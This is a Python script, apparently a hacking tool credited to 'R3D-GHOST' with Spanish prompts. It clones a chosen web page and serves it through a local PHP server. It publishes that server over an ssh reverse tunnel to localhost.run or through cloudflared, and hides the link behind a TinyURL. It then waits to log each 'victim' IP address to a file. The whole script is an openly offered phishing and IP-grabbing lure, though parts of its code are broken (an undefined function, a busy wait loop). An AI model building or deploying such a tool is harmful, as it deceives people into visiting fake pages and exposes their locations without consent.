import os
import time
import requests
import pyshorteners
import threading

def clonar(url):
    try:
        datos = requests.get(url)
        with open("index.html", "wb") as guarda:
            guarda.write(datos.content)
        
        shortened_url = get_shortened_link(url)
        print("Link acortado:", shortened_url)
        
        return "Done..."
    except Exception as e:
        return f"Error: {str(e)}"

def banner():
    banner = "IP "
    print(banner)
    print("By: FrankoSav By R3D-GHOST")
    os.system("killall php")
    os.system("clear")
    print(banner)
    print("1 Clonar WEB")
    print("2 EXIT")

    choice = input("Enter the number: ")

    if choice == "1":
        url = input("Enter the URL of the page you want to clone: ")
        datos = clonar(url)
        print(datos)
        server()

    elif choice == "2":
        print("Goodbye")

def get_shortened_link(url):
    s = pyshorteners.Shortener()
    shortened_url = s.tinyurl.short(url)
    return shortened_url

def bgtask(command):
    try:
        return os.system(command)
    except Exception as e:
        append(e, error_file)

if not os.path.isfile('server/cloudflared'):
    print('\n\033[31m[!] Cloudflare no esta instalado.')
    print('\n\033[35m[~] Instalando cloudflare...')
    os.system("bash ltunnel.sh")

def check():
    while True:
        if os.path.isfile('ip.txt'):
            print(' ')
            print('\n\033[94m[~] IP de la victima encontrado!')
            with open('ip.txt') as ip:
                lines = ip.read().rstrip()
                if len(lines) != 0:
                    print(' ')
                    os.system("cat ip.txt")
                    os.system("cat ip.txt >> ip_guardadas.txt")
                    print('\n\033[32m[~] IP guardados en: ip_guardadas.txt')
                    os.remove("ip.txt")
            ip.close()

def server():
    os.system("clear")
    print('[~] Iniciando servidor php...')
    file = open('index.php')
    print('\n[~] Creando link...')
    time.sleep(2)
    t = threading.Thread(target=ssh)
    t.start()
    os.system("clear")
    print("")
    print(f'\n\033[34m[~] Link acortado: {get_shortened_link("http://localhost:8080")}')
    print("")
    print(f'\n\033[34m[~]Esperando datos...')
    check()

def ssh():
    os.system("php -S localhost:8080 > /dev/null 2>&1 &")
    os.system("ssh -R 80:localhost:8080 nokey@localhost.run ")
    

banner()
